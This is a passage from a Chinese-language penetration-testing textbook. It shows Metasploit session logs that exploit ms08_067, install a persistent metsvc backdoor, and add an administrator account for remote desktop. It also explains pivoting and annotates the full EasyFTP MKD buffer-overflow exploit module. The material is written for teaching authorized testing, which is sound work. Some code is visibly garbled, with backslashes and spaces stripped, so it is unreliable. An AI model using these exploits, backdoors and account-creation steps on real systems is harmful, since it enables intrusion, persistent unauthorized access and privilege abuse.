正如您所看到的，我们已经转储了目标的网络浏览活动。同样，我们还可以通过将`winlogon.exe`进程（`648`）迁移来捕获登录到系统的所有用户的凭据。

您已经利用并获得了对目标系统的访问权限，但现在希望保持此访问权限，即使在以后的阶段修补了被利用的服务或应用程序。这种活动通常被称为后门服务。请注意，meterpreter shell 提供的后门服务在访问目标系统上的特定网络端口之前不需要进行身份验证。这可能允许一些不速之客访问您的目标，并构成重大风险。作为渗透测试规则的一部分，通常不允许这种活动。因此，我们强烈建议您将后门服务远离官方的渗透测试环境。您还应确保在范围和规则确定阶段明确允许了这一点：

```
 msf exploit(ms08_067_netapi) > exploit
    [*] Started reverse handler on 192.168.0.3:4444
    [*] Automatically detecting the target...
    [*] Fingerprint: Windows XP Service Pack 2 - lang:English
    [*] Selected Target: Windows XP SP2 English (NX)
    [*] Attempting to trigger the vulnerability...
    [*] Sending stage (749056 bytes) to 192.168.0.7
    [*] Meterpreter session 1 opened (192.168.0.3:4444 -> 192.168.0.7:1032) at Tue Nov 16 19:21:39 +0000 2010
    meterpreter>ps
    ...
     292   alg.exe           x86   0        NT AUTHORITYLOCAL SERVICE     C:WINDOWSSystem32alg.exe
    1840  csrss.exe         x86   2        NT AUTHORITYSYSTEM            ??C:WINDOWSsystem32csrss.exe
     528   winlogon.exe      x86   2        NT AUTHORITYSYSTEM            ??C:WINDOWSsystem32winlogon.exe
     240   rdpclip.exe       x86   0        CUSTDESKMomin Desktop         C:WINDOWSsystem32rdpclip.exe
    1060  userinit.exe      x86   0        CUSTDESKMomin Desktop         C:WINDOWSsystem32userinit.exe
    1544  explorer.exe      x86   0        CUSTDESKMomin Desktop         C:WINDOWSExplorer.EXE
    ...
    meterpreter> migrate 1544
    [*] Migrating to 1544...
    [*] Migration completed successfully.
    meterpreter> run metsvc -h
    ...
    meterpreter> run metsvc
    [*] Creating a meterpreter service on port 31337
    [*] Creating a temporary installation directory  C:DOCUME~1MOMIND~1LOCALS~1TempoNyLOPeS...
    [*]  >> Uploading metsrv.dll...
    [*]  >> Uploading metsvc-server.exe...
    [*]  >> Uploading metsvc.exe...
    [*] Starting the service...
             * Installing service metsvc
     * Starting service
    Service metsvc successfully installed. 
```

因此，我们最终在我们的目标上启动了后门服务。我们将关闭当前的 meterpreter 会话，并使用`windows/metsvc_bind_tcp`有效载荷的`multi/handler`与我们的后门服务进行交互：

```
 meterpreter> exit
 [*] Meterpreter session 1 closed. Reason: User exit msf exploit(ms08_067_netapi) > back msf> use exploit/multi/handler msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp PAYLOAD => windows/metsvc_bind_tcp msf exploit(handler) > set LPORT 31337 LPORT => 31337 msf exploit(handler) > set RHOST 192.168.0.7 RHOST => 192.168.0.7 msf exploit(handler) > exploit [*] Starting the payload handler... [*] Started bind handler [*] Meterpreter session 2 opened (192.168.0.3:37251 -> 192.168.0.7:31337) at Tue Nov 16 20:02:05 +0000 2010 meterpreter>getuid Server username: NT AUTHORITYSYSTEM
```

让我们使用另一个有用的 meterpreter 脚本`getgui`，为我们的目标启用远程桌面访问。以下练习将在目标上创建一个新用户帐户，并在以前禁用远程桌面服务的情况下启用远程桌面服务：

```
 meterpreter> run getgui -u btuser -p btpass
    [*] Windows Remote Desktop Configuration Meterpreter Script by  Darkoperator
    [*] Carlos Perez carlos_perez@darkoperator.com
    [*] Language set by user to: 'en_EN'
    [*] Setting user account for logon
    [*]     Adding User: btuser with Password: btpass
    [*]     Adding User: btuser to local group 'Remote Desktop Users'
    [*]     Adding User: btuser to local group 'Administrators'
    [*] You can now login with the created user
    [*] For cleanup use command: run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up__20101116.3447.rc 
```

现在，我们可以使用`rdesktop`程序登录到我们的目标系统，方法是在另一个终端上输入以下命令：

```
 # rdesktop 192.168.0.7:3389 
```

请注意，如果您已经拥有目标机器上任何现有用户的破解密码，您可以简单地执行`run getgui -e`命令来启用远程桌面服务，而不是添加新用户。此外，请不要忘记通过执行上一个输出末尾引用的`getgui/clean_up`脚本来清理系统中的痕迹。

我应该如何通过深入访问无法从外部访问的目标网络来扩展我的攻击范围？Metasploit 提供了使用`route add targetSubnettargetSubnetMaskSessionId`命令查看和添加到目标网络的新路由的能力（例如，route add `10.2.4.0 255.255.255.0 1`）。这里，`SessionId`参数指向现有的 meterpreter 会话（网关），而`targetsubnet`参数是另一个网络地址（或双重家庭以太网网络地址），位于我们受损目标之外。一旦您设置 Metasploit 通过受损主机会话路由所有流量，我们就准备好进一步渗透通常无法从我们这边路由的网络。这通常被称为枢纽或立足点。

# 编写利用模块

开发利用是 Metasploit 框架中最有趣的方面之一。在本节中，我们将简要讨论围绕利用开发的核心问题，并通过从现有框架数据库中获取的实时示例解释其关键骨架。然而，在尝试编写自己的利用模块之前，熟练掌握 Ruby 编程语言非常重要。另一方面，中级的逆向工程技能和对漏洞发现工具（例如模糊测试工具和调试器）的实际理解为利用构建提供了一张开放的地图。本节仅作为该主题的介绍，而不是完整的指南。

对于我们的示例，我们选择了漏洞（EasyFTP Server <= 1.7.0.11 MKD Command Stack Buffer Overflow），它将提供对 Easy FTP Server 应用程序中缓冲区溢出漏洞的基本视图。您可以将此模块移植到其他 FTP 服务器应用程序中发现的类似漏洞，并有效利用您的时间。漏洞代码位于`/usr/share/metasploit-framework/modules/exploits/windows/ftp/easyftp_mkd_fixret.rb`：

```
 ##
    # $Id: easyftp_mkd_fixret.rb 9935 2010-07-27 02:25:15Z jduck $
    ## 
```

上述代码是表示文件名、修订号以及漏洞的日期和时间值的基本标头：

```
 ##
    # This file is part of the Metasploit Framework and may be subject  to
    # redistribution and commercial restrictions. Please see the  Metasploit
    # Framework web site for more information on licensing and terms  of use.
    # http://metasploit.com/framework/
    ##
    require 'msf/core' 
```

MSF 核心库需要在利用开始时进行初始化：

```
class Metasploit3 <Msf::Exploit::Remote 
```

在上述代码中，`Exploitmixin/`类是为远程 TCP 连接提供各种选项和方法的类，例如`RHOST`、`RPORT`、`Connect()`、`Disconnect()`和`SSL()`。以下代码是根据其频繁需求和使用分配给漏洞的等级：

```
 Rank = GreatRanking 
```

在以下代码中，`Ftp mixin/`类与 FTP 服务器建立连接：

```
includeMsf::Exploit::Remote::Ftp 
```

以下代码提供了有关漏洞的通用信息，并指向已知的参考资料：

```
def initialize(info = {}) 
super(update_info(info, 
      'Name'           => 'EasyFTP Server <= 1.7.0.11 MKD Command  Stack Buffer Overflow', 
      'Description'    => %q{ 
          This module exploits a stack-based buffer overflow in  EasyFTP Server 1.7.0.11 
and earlier. EasyFTP fails to check input size when  parsing 'MKD' commands, which 
leads to a stack based buffer overflow. 

        NOTE: EasyFTP allows anonymous access by default. However,  in order to access the 
        'MKD' command, you must have access to an account that can create directories. 

        After version 1.7.0.12, this package was renamed  "UplusFtp". 

        This exploit utilizes a small piece of code that I've  referred to as 'fixRet'. 
        This code allows us to inject of payload of ~500 bytes  into a 264 byte buffer by 
        'fixing' the return address post-exploitation.  See  references for more information. 
      }, 
      'Author'         => 
        [ 
          'x90c',   # original version 
          'jduck'   # port to metasploit / modified to use fix-up  stub (works with bigger payloads) 
        ], 
      'License'        => MSF_LICENSE, 
      'Version'        => '$Revision: 9935 $', 
      'References'     => 
        [ 
[ 'OSVDB', '62134' ], 
[ 'URL', 'http://www.exploit-db.com/exploits/12044/' ], 
[ 'URL', 'http://www.exploit-db.com/exploits/14399/' ] 
        ], 
```

以下代码指示有效载荷在执行过程完成后清理自身：

```
 'DefaultOptions' => 
        { 
          'EXITFUNC' => 'thread' 
```

以下代码片段定义了 512 字节的空间供 shellcode 使用，列出了应该终止我们有效载荷传递的不良字符，并禁用了 NOP 填充：

```
 }, 
      'Privileged'     => false, 
      'Payload'        => 
        { 
          'Space'    => 512, 
          'BadChars' => "x00x0ax0dx2fx5c", 
          'DisableNops' => true 
        }, 
```

以下代码片段提供了有关目标平台和定义易受攻击目标（`0`到`9`）的说明，列出了 Easy FTP Server 的不同版本（`1.7.0.2`至`1.7.0.11`），每个版本都基于应用程序二进制文件（`ftpbasicsvr.exe`）的唯一返回地址。此外，还添加了漏洞披露日期，并将默认目标设置为`0`（`v1.7.0.2`）：

```
 'Platform'       => 'win', 
      'Targets'        => 
        [ 
[ 'Windows Universal - v1.7.0.2',   { 'Ret' =>           0x004041ec } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.3',   { 'Ret' =>           0x004041ec } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.4',   { 'Ret' =>           0x004041dc } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.5',   { 'Ret' =>           0x004041a1 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.6',   { 'Ret' =>           0x004041a1 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.7',   { 'Ret' =>           0x004041a1 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.8',   { 'Ret' =>           0x00404481 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.9',   { 'Ret' =>           0x00404441 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.10',  { 'Ret' =>           0x00404411 } ], # call ebp - from ftpbasicsvr.exe 
[ 'Windows Universal - v1.7.0.11',  { 'Ret' =>           0x00404411 } ], # call ebp - from ftpbasicsvr.exe 
        ], 
      'DisclosureDate' => 'Apr 04 2010', 
      'DefaultTarget' => 0)) 
```

在以下代码中，`check()`函数确定目标是否易受攻击：

```
end 

def check 
connect 
disconnect 

if (banner =~ /BigFoolCat/) 
return Exploit::CheckCode::Vulnerable 
end 
return Exploit::CheckCode::Safe 
end 
```

以下代码定义了一个生成 NOP 滑梯以帮助 IDS/IPS/AV 规避的函数。一些人认为 NOP 滑梯是解决这个问题的一个快速而肮脏的解决方案，并认为除非有特别好的理由，否则不应该使用它们。为简单起见，在编写模块的示例中，我们在代码中保留了该函数：

```
defmake_nops(num); "C" * num; end 
```

以下过程修复了一个返回地址，从这个地址可以执行有效负载。从技术上讲，它解决了栈寻址的问题：

```
def exploit 
connect_login 

    # NOTE: 
    # This exploit jumps to ebp, which happens to point at a      partial version of 
    # the 'buf' string in memory. The fixRet below fixes up the      code stored on the 
    # stack and then jumps there to execute the payload. The value      inesp is used 
    # with an offset for the fixup. 
fixRet_asm = %q{ 
movedi,esp 
subedi, 0xfffffe10 
mov [edi], 0xfeedfed5 
addedi, 0xffffff14 
jmpedi 
    } 
fixRet = Metasm::Shellcode.assemble(Metasm::Ia32.new,  fixRet_asm).encode_string 

buf = '' 
```

最初，利用缓冲区包含编码的返回地址和随机化的 NOP 指令：

```
print_status("Prepending fixRet...") 
buf<<fixRet 
buf<<make_nops(0x20 - buf.length)
```

以下代码在运行时向我们的利用程序中添加了一个动态生成的 shellcode：

```
print_status("Adding the payload...") 
buf<<payload.encoded 
```

以下代码修复了堆栈数据，并在保存我们的 shellcode 缓冲区的返回地址上进行了短跳转：

```
 # Patch the original stack data into the fixer stub 
buf[10, 4] = buf[268, 4] 

print_status("Overwriting part of the payload with target      address...") 
buf[268,4] = [target.ret].pack('V') # put return address @ 268      bytes 
```

最后，使用前面的代码，我们使用易受攻击的 MKD FTP 后身份验证命令将我们的最终缓冲区发送到特定目标。由于 Easy FTP 服务器中的 MKD 命令容易受到基于堆栈的缓冲区溢出的影响，`buf`命令将溢出目标堆栈，并通过执行我们的有效负载来利用目标系统：

```
print_status("Sending exploit buffer...") 
send_cmd( ['MKD', buf] , false) 
```

使用以下代码关闭您的连接：

```
handler 
disconnect 
end 

end 
```

Metasploit 配备了有用的工具，例如`msfpescan`用于 Win32 和`msfelfscan`用于 Linux 系统，这些工具可能会帮助您找到特定目标的返回地址。例如，要从您选择的应用程序文件中找到一个可持续的返回地址，请键入`# msfpescan -p targetapp.ext`。

# 摘要

在本章中，我们指出了目标开发所需的几个关键领域。首先，我们概述了弱点研究，强调了渗透测试人员需要具备必要的知识和技能，这反过来又对弱点评估产生了影响。然后，我们提供了一个在线存储库列表，您可以从中获取许多公开披露的漏洞和利用代码。在最后一部分，我们演示了一个名为 Metasploit 框架的高级利用工具包的实际用途。所提供的练习纯粹旨在通过战术利用方法探索和理解目标获取过程。此外，我们通过分析框架中示例利用代码的每个步骤，解释了对利用开发的见解，以帮助您理解基本的骨架和构建策略。

在下一章中，我们将讨论提权和使用各种工具和技术维持访问的过程，以及在获得目标后它如何有益。
